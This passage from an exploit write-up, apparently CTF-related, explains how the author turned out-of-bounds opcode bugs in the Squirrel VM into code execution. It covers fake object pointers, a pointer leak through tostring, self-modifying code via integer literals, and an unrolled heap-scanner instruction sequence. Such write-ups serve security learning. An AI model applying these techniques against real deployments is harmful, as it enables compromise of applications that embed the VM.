	OT_THREAD <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_THREAD <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_FUNCPROTO <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_FUNCPROTO <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//internal usage only</span>
	OT_CLASS <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_CLASS <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_INSTANCE <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_INSTANCE <span class="token operator">|</span> SQOBJECT_REF_COUNTED <span class="token operator">|</span> SQOBJECT_DELEGABLE<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_WEAKREF <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_WEAKREF <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span>
	OT_OUTER <span class="token operator">=</span> <span class="token punctuation">(</span>_RT_OUTER <span class="token operator">|</span> SQOBJECT_REF_COUNTED<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//internal usage only</span>
	WIERD_TYPE <span class="token operator">=</span> <span class="token number">0x00</span>
<span class="token punctuation">}</span>SQObjectType<span class="token punctuation">;</span>
</pre><p>Everything else is implemented as a class.</p>
<h3 class="mume-header" id="bug-hunting">Bug hunting</h3>

<p>I found many bugs in the VM code, some that are exploitable, and some that aren&apos;t, well at least not that easy (<em>try to exploit the type confusion in <code>_OP_APPENDARRAY</code>, I tried to do it using a string, but you need some leaks and there are many easier bugs to exploit</em>).</p>
<p>For my exploit I used mainly <code>OOB bugs</code> since there are <code>no argument bounds check</code> for any opcode. Opcodes that are useful are <code>_OP_LOAD</code>, it loads a object pointer from the literals section onto the stack and <code>_OP_MOVE</code> that copies a pointer from one location on the stack to another one. The literals section is quite interesting, because it is used in a big chunk of memory that contains multiple sections an therefore a OOB onto the other sections would not be affected by the heap layout.</p>
<pre data-role="codeBlock" data-info="c" class="language-c">    <span class="token keyword">static</span> SQFunctionProto <span class="token operator">*</span><span class="token function">Create</span><span class="token punctuation">(</span>SQSharedState <span class="token operator">*</span>ss<span class="token punctuation">,</span>SQInteger ninstructions<span class="token punctuation">,</span>
        SQInteger nliterals<span class="token punctuation">,</span>SQInteger nparameters<span class="token punctuation">,</span>
        SQInteger nfunctions<span class="token punctuation">,</span>SQInteger noutervalues<span class="token punctuation">,</span>
        SQInteger nlineinfos<span class="token punctuation">,</span>SQInteger nlocalvarinfos<span class="token punctuation">,</span>SQInteger ndefaultparams<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        SQFunctionProto <span class="token operator">*</span>f<span class="token punctuation">;</span>
        <span class="token comment">//I compact the whole class and members in a single memory allocation</span>
        f <span class="token operator">=</span> <span class="token punctuation">(</span>SQFunctionProto <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sq_vm_malloc</span><span class="token punctuation">(</span><span class="token function">_FUNC_SIZE</span><span class="token punctuation">(</span>ninstructions<span class="token punctuation">,</span>nliterals<span class="token punctuation">,</span>nparameters<span class="token punctuation">,</span>nfunctions<span class="token punctuation">,</span>noutervalues<span class="token punctuation">,</span>nlineinfos<span class="token punctuation">,</span>nlocalvarinfos<span class="token punctuation">,</span>ndefaultparams<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">new</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token function">SQFunctionProto</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_ninstructions <span class="token operator">=</span> ninstructions<span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_literals <span class="token operator">=</span> <span class="token punctuation">(</span>SQObjectPtr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>f<span class="token operator">-&gt;</span>_instructions<span class="token punctuation">[</span>ninstructions<span class="token punctuation">]</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_nliterals <span class="token operator">=</span> nliterals<span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_parameters <span class="token operator">=</span> <span class="token punctuation">(</span>SQObjectPtr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>f<span class="token operator">-&gt;</span>_literals<span class="token punctuation">[</span>nliterals<span class="token punctuation">]</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_nparameters <span class="token operator">=</span> nparameters<span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_functions <span class="token operator">=</span> <span class="token punctuation">(</span>SQObjectPtr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>f<span class="token operator">-&gt;</span>_parameters<span class="token punctuation">[</span>nparameters<span class="token punctuation">]</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_nfunctions <span class="token operator">=</span> nfunctions<span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_outervalues <span class="token operator">=</span> <span class="token punctuation">(</span>SQOuterVar<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>f<span class="token operator">-&gt;</span>_functions<span class="token punctuation">[</span>nfunctions<span class="token punctuation">]</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_noutervalues <span class="token operator">=</span> noutervalues<span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_lineinfos <span class="token operator">=</span> <span class="token punctuation">(</span>SQLineInfo <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>f<span class="token operator">-&gt;</span>_outervalues<span class="token punctuation">[</span>noutervalues<span class="token punctuation">]</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_nlineinfos <span class="token operator">=</span> nlineinfos<span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_localvarinfos <span class="token operator">=</span> <span class="token punctuation">(</span>SQLocalVarInfo <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>f<span class="token operator">-&gt;</span>_lineinfos<span class="token punctuation">[</span>nlineinfos<span class="token punctuation">]</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_nlocalvarinfos <span class="token operator">=</span> nlocalvarinfos<span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_defaultparams <span class="token operator">=</span> <span class="token punctuation">(</span>SQInteger <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>f<span class="token operator">-&gt;</span>_localvarinfos<span class="token punctuation">[</span>nlocalvarinfos<span class="token punctuation">]</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_ndefaultparams <span class="token operator">=</span> ndefaultparams<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</pre><p>Using this <code>&quot;fake&quot; object</code> pointers can be loaded onto the stack, if they are created in one of the sections in the same chunk. I decided to append <code>16 bytes</code> to the <code>instructions</code> and then use a <code>_OP_LOAD</code> oob read to load for example a <code>fake native closure</code>, a object pointing to a native function, onto the stack. I wrote a <strong>basic</strong> <code>disassembler</code> and an <code>assembler</code> for squirrel and did some testing, it worked, but what ever I tried there was <code>no way around a leak</code>. But even if I would get a leak, <code>I can&apos;t change my instructions in runtime</code>. This problem was quite hard for me to overcome. I searched for other bugs and developed some strategies that would utilise <code>heap sprays</code> or <code>static offsets on the heap</code>, I should have gone with heap spraying, but for some reason I can&apos;t remember I didn&apos;t.</p>
<p>I did some Windows pwning and got used to the tooling, therefore I decided to exploit it on Windows first and then back-port it to Linux. This was a bad idea, since I later realized, that the <code>heap offsets on Linux were static</code>, but the <code>Windows heap offsets were random</code> and therefore I decided to go back to my first idea.</p>
<h3 class="mume-header" id="something-something-self-modifying-code-shell">Something something self-modifying code -&gt; shell</h3>

<p><code>I can&apos;t change my instructions in runtime.</code> or can I?! If I would know the offset from the stack to the instruction section I could use a <code>JMP</code> instruction to jump to the stack and execute my squirrel code there. And since every Instruction is just <code>8 bytes</code> I could just use the <code>_OT_INTEGER</code> objects, since I can do simple integer arithmetic with their value, which is exactly <code>8 bytes</code>. And <code>_OT_INTEGER</code> type interpreted as a instruction is:</p>
<pre data-role="codeBlock" data-info="lua" class="language-lua"><span class="token number">0x0500000200000000</span><span class="token punctuation">:</span> _OP_LINE arg0<span class="token punctuation">:</span> <span class="token number">0x00</span> arg1<span class="token punctuation">:</span> <span class="token number">0x05000002</span> arg2<span class="token punctuation">:</span> <span class="token number">0x00</span> arg3<span class="token punctuation">:</span> <span class="token number">0x00</span>
</pre><p>By taking a look at the <code>_OP_LINE</code> implementation, it can be seen that it is like a <code>NOP</code> instruction if no <code>_debughook</code> is set, which is the case.</p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp"><span class="token keyword">case</span> _OP_LINE<span class="token operator">:</span> 
	<span class="token keyword">if</span> <span class="token punctuation">(</span>_debughook<span class="token punctuation">)</span> <span class="token function">CallDebugHook</span><span class="token punctuation">(</span><span class="token function">_SC</span><span class="token punctuation">(</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arg1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
</pre><p>The instruction pointer will just continue to the value of the <code>_OT_INTEGER</code>. If I now get a leak I can change for example <code>arg1</code> for <code>_OP_MOVE</code> to read at any address I want. For the leak I use the <code>tostring</code> closure, it reads a <code>SQObjectPtr</code> from the stack and depending on the type return different strings.</p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp"><span class="token keyword">bool</span> SQVM<span class="token operator">::</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token keyword">const</span> SQObjectPtr <span class="token operator">&amp;</span>o<span class="token punctuation">,</span>SQObjectPtr <span class="token operator">&amp;</span>res<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">sq_type</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> OT_STRING<span class="token operator">:</span>
        res <span class="token operator">=</span> o<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> OT_FLOAT<span class="token operator">:</span>
        <span class="token function">scsprintf</span><span class="token punctuation">(</span><span class="token function">_sp</span><span class="token punctuation">(</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span>NUMBER_MAX_CHAR<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span>NUMBER_MAX_CHAR<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">_SC</span><span class="token punctuation">(</span><span class="token string">&quot;%g&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">_float</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> OT_INTEGER<span class="token operator">:</span>
        <span class="token function">scsprintf</span><span class="token punctuation">(</span><span class="token function">_sp</span><span class="token punctuation">(</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span>NUMBER_MAX_CHAR<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span>NUMBER_MAX_CHAR<span class="token punctuation">)</span><span class="token punctuation">,</span>_PRINT_INT_FMT<span class="token punctuation">,</span><span class="token function">_integer</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> OT_BOOL<span class="token operator">:</span>
        <span class="token function">scsprintf</span><span class="token punctuation">(</span><span class="token function">_sp</span><span class="token punctuation">(</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">_integer</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">_SC</span><span class="token punctuation">(</span><span class="token string">&quot;true&quot;</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">_SC</span><span class="token punctuation">(</span><span class="token string">&quot;false&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> OT_NULL<span class="token operator">:</span>
        <span class="token function">scsprintf</span><span class="token punctuation">(</span><span class="token function">_sp</span><span class="token punctuation">(</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">_SC</span><span class="token punctuation">(</span><span class="token string">&quot;null&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> OT_TABLE<span class="token operator">:</span>
    <span class="token keyword">case</span> OT_USERDATA<span class="token operator">:</span>
    <span class="token keyword">case</span> OT_INSTANCE<span class="token operator">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">_delegable</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_delegate<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            SQObjectPtr closure<span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">_delegable</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">GetMetaMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> MT_TOSTRING<span class="token punctuation">,</span> closure<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">Push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">CallMetaMethod</span><span class="token punctuation">(</span>closure<span class="token punctuation">,</span>MT_TOSTRING<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sq_type</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">==</span> OT_STRING<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SQString<span class="token punctuation">)</span><span class="token punctuation">;</span>
        SQObjectPtr<span class="token operator">*</span>  b <span class="token operator">=</span> <span class="token function">_array</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_values<span class="token punctuation">.</span>_vals<span class="token punctuation">;</span>
        <span class="token function">scsprintf</span><span class="token punctuation">(</span><span class="token function">_sp</span><span class="token punctuation">(</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>NUMBER_MAX_CHAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">sq_rsl</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>NUMBER_MAX_CHAR<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">_SC</span><span class="token punctuation">(</span><span class="token string">&quot;(%s : 0x%p)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">GetTypeName</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_rawval</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    res <span class="token operator">=</span> SQString<span class="token operator">::</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token function">_ss</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_spval<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</pre><p>The default case is quite interesting, since it will <code>print just the raw pointer value</code>. There is the leak. One problem remains, how do I get the instruction pointer onto the squirrel stack?! A <code>heap scanner</code> could be used to scan for a value on the stack to get the offset. My first idea was using <code>_OP_MOVE</code> with a negative <code>arg1</code> to scan the heap. A basic heap scanner would look like this:</p>
<pre data-role="codeBlock" data-info="lua" class="language-lua"><span class="token keyword">local</span> cmp <span class="token operator">=</span> <span class="token number">0x411337421337</span>
<span class="token keyword">local</span> cmp2 <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">local</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> scan_width<span class="token punctuation">;</span> i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token function">asm</span><span class="token punctuation">{</span>
		_OP_MOVE<span class="token punctuation">:</span> arg0<span class="token punctuation">:</span> <span class="token function">stack_addr</span><span class="token punctuation">(</span>cmp2<span class="token punctuation">)</span> arg1<span class="token punctuation">:</span> <span class="token operator">-</span>i arg2<span class="token punctuation">:</span><span class="token number">0</span> arg3<span class="token punctuation">:</span> <span class="token number">0</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>cmp <span class="token operator">==</span> cmp2<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">asm</span><span class="token punctuation">{</span>
			_OP_JMP<span class="token punctuation">:</span> arg0<span class="token punctuation">:</span> <span class="token number">0</span> arg1<span class="token punctuation">:</span> i<span class="token operator">-</span>ip_offset<span class="token operator">-</span>stack_base<span class="token operator">-</span>literal_offset arg2<span class="token punctuation">:</span> <span class="token number">0</span> arg3<span class="token punctuation">:</span> <span class="token number">0</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</pre><p>The code above would, in theory, scan the heap <code>from the stack</code> <code>to the literals section</code> of the function, since integers with more than 4 bytes are stored as a literal. After that it would jump that offset, but the offset needs to be adjusted depending on the <code>stack_base, literal location and instruction pointer location</code>. The loop has to be enrolled, since it is still not possible to modify the instruction in runtime. I wrote some assembly code based on that, optimized for size. After many hours of fine tuning I came up with those instructions:</p>
<pre data-role="codeBlock" data-info class="language-"><code>stack:
	base + 0x00: 0x411337421337

NE          a0: 1 a1:-10 a2:0x00 a3:0x00
JZ          a0: 1 a1:-10 a2:0x00 a3:0x00
NE          a0: 1 a1:-11 a2:0x00 a3:0x00
JZ          a0: 1 a1:-11 a2:0x00 a3:0x00
NE          a0: 1 a1:-12 a2:0x00 a3:0x00
JZ          a0: 1 a1:-12 a2:0x00 a3:0x00
NE          a0: 1 a1:-13 a2:0x00 a3:0x00
JZ          a0: 1 a1:-13 a2:0x00 a3:0x00
[...]
</code></pre><p>The idea is to use <code>_OP_NE</code> instead of <code>_OP_MOVE</code> and <code>_OP_CMP</code> since it is less code and more important: <code>_OP_MOVE</code> copies the <code>SQObjectPtr</code> on the stack first, by doing so, squirrel will increase the reference count if the <code>SQOBJECT_REF_COUNTED</code> bit is set, this will result in many invalid dereferences and crash the program. <code>_OP_NE</code> uses <code>SQVM::IsEqual</code> and checks if th types match and if their raw value matches, if not it will do some special checks for integers and floats, but <code>it will never dereference anything</code> and is therefore perfect.</p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp"><span class="token keyword">case</span> _OP_NE<span class="token operator">:</span><span class="token punctuation">{</span>
    <span class="token keyword">bool</span> res<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsEqual</span><span class="token punctuation">(</span><span class="token function">STK</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">,</span>COND_LITERAL<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">SQ_THROW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    TARGET <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token operator">?</span><span class="token boolean">true</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
</pre><p><code>_OP_JZ</code> just checks if the target (<code>STK(arg0)</code>) is false and increments the instruction pointer by <code>arg1</code> if thats the case.</p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp"><span class="token keyword">case</span> _OP_JZ<span class="token operator">:</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">IsFalse</span><span class="token punctuation">(</span><span class="token function">STK</span><span class="token punctuation">(</span>arg0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ci<span class="token operator">-&gt;</span>_ip<span class="token operator">+=</span><span class="token punctuation">(</span>sarg1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
</pre><p>And by combining those two instructions, the instruction count is reduced to <code>2 instructions per loop cycle</code>.</p>
<p>And it can be done even better:<br>
By not trying to find the exact offset by using a search step size of 64 and creating that amount of literals, it is possible to scan <code>n = 0x1000</code> in <code>128</code> instructions instead of <code>8192&#x202C;</code>, but it would produce more literals resulting in <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mn>2</mn><mi>n</mi></mrow><mi>x</mi></mfrac><mo>&#x22C5;</mo><mn>8</mn><mo>+</mo><mi>x</mi><mo>&#x22C5;</mo><mn>16</mn><mo>=</mo><mn>2048</mn><mtext>&#x202C;</mtext></mrow><annotation encoding="application/x-tex">\frac{2n}{x} \cdot 8 + x \cdot 16= 2048 &#x202C;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">&#x200B;</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x22C5;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x22C5;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">4</span><span class="mord">8</span><span class="mord">&#x202C;</span></span></span></span> bytes compared to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>n</mi><mo>&#x22C5;</mo><mn>8</mn><mo>+</mo><mn>1</mn><mo>&#x22C5;</mo><mn>16</mn><mo>=</mo><mn>65552</mn></mrow><annotation encoding="application/x-tex">2n \cdot 8 + 1 \cdot 16 = 65552</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x22C5;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x22C5;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">5</span><span class="mord">5</span><span class="mord">5</span><span class="mord">2</span></span></span></span> bytes<br>
Here the calculation for the step size:<br>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mi>n</mi><mi>x</mi></mfrac><mo>+</mo><mi>x</mi><mspace linebreak="newline"></mspace><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">&#x2032;</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>&#x2212;</mo><mfrac><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup></mfrac><mspace linebreak="newline"></mspace><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">&#x2032;</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo><mover><mo><mo>=</mo></mo><mo stretchy="false" lspace="0em" rspace="0em">!</mo></mover></mo><mn>0</mn><mspace linebreak="newline"></mspace><mpadded lspace="-1width" width="0px"><mrow><mstyle scriptlevel="0" displaystyle="false"><mo>&#x2192;</mo></mstyle><mspace width="5em"></mspace></mrow></mpadded><mi>x</mi><mo>=</mo><mo>&#xB1;</mo><msqrt><mi>n</mi></msqrt></mrow><annotation encoding="application/x-tex">f(x) = \frac{n}{x} + x \\
f&apos;(x) = 1-\frac{n}{x^2} \\
f&apos;(x) \overset{!}{=} 0 \\
